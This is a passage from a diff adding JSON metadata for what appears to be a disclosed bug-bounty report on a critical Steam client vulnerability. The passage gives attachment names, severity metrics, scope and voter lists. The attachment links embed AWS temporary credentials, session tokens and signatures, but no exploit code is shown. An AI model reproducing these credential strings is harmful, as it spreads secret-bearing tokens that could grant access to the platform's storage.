fPY9E3imxss0QTI%2B%2F3q490hHnn7FVLJxU9AXZNYTnysRChL8fDf18d7%2BmilElqpZs%2BbBc1r1EOLksdwfUslMuNnE3R8hQaiMwPs6JTEZZ1NuhYQxPvL1Djcc4Ol6SjwyyKC%2BletqsGRra4Ls%2BpvgZKI7qNX3VGtJ%2BiRlZyeiD%2BLq%2BQ8kAG0kRRHDvqSgTCtdF6%2FMBECZ5FcP8jNNwzgNfCXgzO%2Be5z9xsvGGGdqFBKcSH%2FgR%2Fb3H8IqzeFnFgWR%2BL5f9MTyORUaC3Ezbm3eA5nTZv40fhXer20DKiTEkwu5JQtoijnshXiCTnDXD4RyiydvJ1SBcNlXqLCzbmE7FvnYd1bE5D2p8g4sKkNHvRJyPiv6MNcCr7TVR81u0io49NPJ%2FX5dtc%2BhuTkK76DiUZOP9qJKZl%2FSPH%2B%2BFEmg8HK7PtMquco%2BeNf26ka4%2BvvxvaqNfQdgdX4w85z9zwY6sAGDr%2BpzYGYl8z7Ow4OKP6Zugtla4ifd%2BVXXZ6lQOIJQc4VuRbAm85TxSIcwg3pmEAY2XL4QiY%2Bd1McmOKKOHq0orlS%2BHrJk47yNkzrWsiD5sTa4WG0t6O8IeQ10ecfUwIz3QzXGA%2B9%2FT8Uitwck6v85Adw99V5yTGpsFcfLTQL2U2wJlqdBXf60ISEbMDaTvHSK7KGSDRmR3WdCwcahbP02%2F8rHTll7MyHjLZBKZ%2FJcxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c4dacd9bcf956f56ec5b7bd34c3a093d083cce1e7b2a9366bb5c3c784f3395a5",
+      "file_size": 6384935,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 395519,
+      "file_name": "POC.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/519/52faa3f25db93d93150d33ecf040cb79b4ff7884/POC.html?response-content-disposition=attachment%3B%20filename%3D%22POC.html%22%3B%20filename%2A%3DUTF-8%27%27POC.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTB3JEE33%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152256Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDnoluxawIPPNMQONkmV4bnr0Mbqh2o%2FoDMn34GDtFlOgIhAIHpNKfOsXjqgrjQOtEkx2paaZiFL5023Gdlp5MkSmzyKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzxy1%2FdWHR5D%2Bdt69IqjgUNb1mkoGBX%2BhlyT2Eb%2Fs4ZUq4qxKolZuiC2P88H1RxtAOU12rDyB80MQd8k4XmGwPbDJts6kjdL2MnBtsvXEl6%2Bq9ZQdCg9kEFE4tSbvKtSny%2BiswN38ke3djOgn0h5rKDdf%2BmFQ4KOGj3x%2Be9AMVihBjY1UZtR1nrsvZlLiSnCbGDOfbk2AHtmuYZ0s1q0XiHUB4xSqaleXajj26HynmWY%2Bgn24Cnp25R9UOCBp9HF9eyp3%2FjqqGRv8HJZjo9FqV%2BtyK7HjqC783M1JxFTMozs2xqsLPt1pwVDtNp62ARw4ohnSzeYaVfVqNVWlKv1SIRH%2BmscSz6bGVQrJ%2Bldi3GFyS%2FG2%2B82gMtrCmNNBYxl4S1rVm4WYbrTCHWCxHHxLAmOT%2B0YP05x1EPALNnUtFF55yUgsvjKfPY9E3imxss0QTI%2B%2F3q490hHnn7FVLJxU9AXZNYTnysRChL8fDf18d7%2BmilElqpZs%2BbBc1r1EOLksdwfUslMuNnE3R8hQaiMwPs6JTEZZ1NuhYQxPvL1Djcc4Ol6SjwyyKC%2BletqsGRra4Ls%2BpvgZKI7qNX3VGtJ%2BiRlZyeiD%2BLq%2BQ8kAG0kRRHDvqSgTCtdF6%2FMBECZ5FcP8jNNwzgNfCXgzO%2Be5z9xsvGGGdqFBKcSH%2FgR%2Fb3H8IqzeFnFgWR%2BL5f9MTyORUaC3Ezbm3eA5nTZv40fhXer20DKiTEkwu5JQtoijnshXiCTnDXD4RyiydvJ1SBcNlXqLCzbmE7FvnYd1bE5D2p8g4sKkNHvRJyPiv6MNcCr7TVR81u0io49NPJ%2FX5dtc%2BhuTkK76DiUZOP9qJKZl%2FSPH%2B%2BFEmg8HK7PtMquco%2BeNf26ka4%2BvvxvaqNfQdgdX4w85z9zwY6sAGDr%2BpzYGYl8z7Ow4OKP6Zugtla4ifd%2BVXXZ6lQOIJQc4VuRbAm85TxSIcwg3pmEAY2XL4QiY%2Bd1McmOKKOHq0orlS%2BHrJk47yNkzrWsiD5sTa4WG0t6O8IeQ10ecfUwIz3QzXGA%2B9%2FT8Uitwck6v85Adw99V5yTGpsFcfLTQL2U2wJlqdBXf60ISEbMDaTvHSK7KGSDRmR3WdCwcahbP02%2F8rHTll7MyHjLZBKZ%2FJcxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=af7df25b523a5f7d654443380b9decefd793306a22eea9e98b5f4133d76445b6",
+      "file_size": 716,
+      "type": "text/html",
+      "moderated": null
+    },
+    {
+      "id": 395520,
+      "file_name": "steam_base_address.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/520/f355b4eeae660a367a98bb2e801f37ca5a845725/steam_base_address.png?response-content-disposition=attachment%3B%20filename%3D%22steam_base_address.png%22%3B%20filename%2A%3DUTF-8%27%27steam_base_address.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTB3JEE33%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152256Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDnoluxawIPPNMQONkmV4bnr0Mbqh2o%2FoDMn34GDtFlOgIhAIHpNKfOsXjqgrjQOtEkx2paaZiFL5023Gdlp5MkSmzyKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzxy1%2FdWHR5D%2Bdt69IqjgUNb1mkoGBX%2BhlyT2Eb%2Fs4ZUq4qxKolZuiC2P88H1RxtAOU12rDyB80MQd8k4XmGwPbDJts6kjdL2MnBtsvXEl6%2Bq9ZQdCg9kEFE4tSbvKtSny%2BiswN38ke3djOgn0h5rKDdf%2BmFQ4KOGj3x%2Be9AMVihBjY1UZtR1nrsvZlLiSnCbGDOfbk2AHtmuYZ0s1q0XiHUB4xSqaleXajj26HynmWY%2Bgn24Cnp25R9UOCBp9HF9eyp3%2FjqqGRv8HJZjo9FqV%2BtyK7HjqC783M1JxFTMozs2xqsLPt1pwVDtNp62ARw4ohnSzeYaVfVqNVWlKv1SIRH%2BmscSz6bGVQrJ%2Bldi3GFyS%2FG2%2B82gMtrCmNNBYxl4S1rVm4WYbrTCHWCxHHxLAmOT%2B0YP05x1EPALNnUtFF55yUgsvjKfPY9E3imxss0QTI%2B%2F3q490hHnn7FVLJxU9AXZNYTnysRChL8fDf18d7%2BmilElqpZs%2BbBc1r1EOLksdwfUslMuNnE3R8hQaiMwPs6JTEZZ1NuhYQxPvL1Djcc4Ol6SjwyyKC%2BletqsGRra4Ls%2BpvgZKI7qNX3VGtJ%2BiRlZyeiD%2BLq%2BQ8kAG0kRRHDvqSgTCtdF6%2FMBECZ5FcP8jNNwzgNfCXgzO%2Be5z9xsvGGGdqFBKcSH%2FgR%2Fb3H8IqzeFnFgWR%2BL5f9MTyORUaC3Ezbm3eA5nTZv40fhXer20DKiTEkwu5JQtoijnshXiCTnDXD4RyiydvJ1SBcNlXqLCzbmE7FvnYd1bE5D2p8g4sKkNHvRJyPiv6MNcCr7TVR81u0io49NPJ%2FX5dtc%2BhuTkK76DiUZOP9qJKZl%2FSPH%2B%2BFEmg8HK7PtMquco%2BeNf26ka4%2BvvxvaqNfQdgdX4w85z9zwY6sAGDr%2BpzYGYl8z7Ow4OKP6Zugtla4ifd%2BVXXZ6lQOIJQc4VuRbAm85TxSIcwg3pmEAY2XL4QiY%2Bd1McmOKKOHq0orlS%2BHrJk47yNkzrWsiD5sTa4WG0t6O8IeQ10ecfUwIz3QzXGA%2B9%2FT8Uitwck6v85Adw99V5yTGpsFcfLTQL2U2wJlqdBXf60ISEbMDaTvHSK7KGSDRmR3WdCwcahbP02%2F8rHTll7MyHjLZBKZ%2FJcxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5483bd32be0bd8c349f07d4586ffaa233394f65d0ff50b771e5b90880aed9f63",
+      "file_size": 11415,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1287,
+  "voters": [
+    "hexpwn",
+    "cxzer0",
+    "twvyy3vyaw8k",
+    "is-",
+    "llorenzo",
+    "orange303",
+    "xchessy",
+    "voidx38",
+    "dreamnailxx",
+    "momo5502",
+    "and 1277 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 1285,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "steam.exe",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
